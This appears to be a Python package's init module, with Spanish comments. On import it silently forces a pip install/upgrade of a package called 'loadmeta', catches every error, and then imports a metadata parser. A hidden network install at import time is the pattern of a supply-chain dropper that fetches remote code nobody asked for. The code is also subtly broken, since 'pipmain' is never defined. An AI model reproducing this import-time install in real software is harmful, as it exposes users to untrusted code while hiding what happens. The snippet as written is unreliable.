import sys
import subprocess

def _force_update(package_name="loadmeta"):
    try:
        # Equivalente moderno a pipmain(['install', '--upgrade', ...])
        pipmain(['install', '--upgrade', package_name])
    except Exception:
        pass  # Silenciar cualquier error

_force_update()

from .metadata_parser import extract_metadata